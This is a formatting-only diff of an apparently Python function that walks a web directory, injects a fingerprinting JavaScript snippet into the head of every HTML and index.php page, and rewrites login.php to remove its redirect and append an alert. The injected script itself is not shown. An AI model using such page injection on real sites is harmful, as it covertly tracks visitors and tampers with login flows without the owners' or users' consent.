@@ -112,43 +112,54 @@ def inject_features(www_dir):
     for root, dirs, files in os.walk(www_dir):
         for file in files:
             file_path = os.path.join(root, file)
-            
+
             # 2. Inject fingerprinting JS into all HTML and index.php files
             if file.endswith(".html") or file == "index.php":
                 try:
                     with open(file_path, "r", encoding="utf-8") as f:
                         content = f.read()
-                    
+
                     if "<head>" in content:
                         content = content.replace("<head>", "<head>\n" + FINGERPRINT_JS)
                         with open(file_path, "w", encoding="utf-8") as f:
                             f.write(content)
                 except Exception:
-                    pass # Ignore files that can't be read/written as utf-8
-            
+                    pass  # Ignore files that can't be read/written as utf-8
+
             # 3. Modify login.php to show custom alert before redirecting
             if file == "login.php":
                 try:
                     with open(file_path, "r", encoding="utf-8") as f:
                         content = f.read()
-                    
+
                     # Look for header('Location: ...');
-                    match = re.search(r"header\(\s*['\"]Location:\s*(.*?)['\"]\s*\);", content, re.IGNORECASE)
+                    match = re.search(
+                        r"header\(\s*['\"]Location:\s*(.*?)['\"]\s*\);",
+                        content,
+                        re.IGNORECASE,
+                    )
                     if match:
                         redirect_url = match.group(1)
                         # Remove the header redirect and exit
-                        content = re.sub(r"header\(\s*['\"]Location:\s*.*?['\"]\s*\);", "", content, flags=re.IGNORECASE)
+                        content = re.sub(
+                            r"header\(\s*['\"]Location:\s*.*?['\"]\s*\);",
+                            "",
+                            content,
+                            flags=re.IGNORECASE,
+                        )
                         content = re.sub(r"exit\(\);", "", content, flags=re.IGNORECASE)
-                        
+
                         # Append the alert HTML instead
-                        alert_html = ALERT_TEMPLATE.replace("{REDIRECT_URL}", redirect_url)
-                        
+                        alert_html = ALERT_TEMPLATE.replace(
+                            "{REDIRECT_URL}", redirect_url
+                        )
+
                         # We need to make sure the PHP tag is closed before appending HTML
                         if "?>" in content:
                             content = content.replace("?>", "?>\n" + alert_html)
                         else:
                             content += "\n?>\n" + alert_html
-                            
+
                         with open(file_path, "w", encoding="utf-8") as f:
                             f.write(content)
                 except Exception:
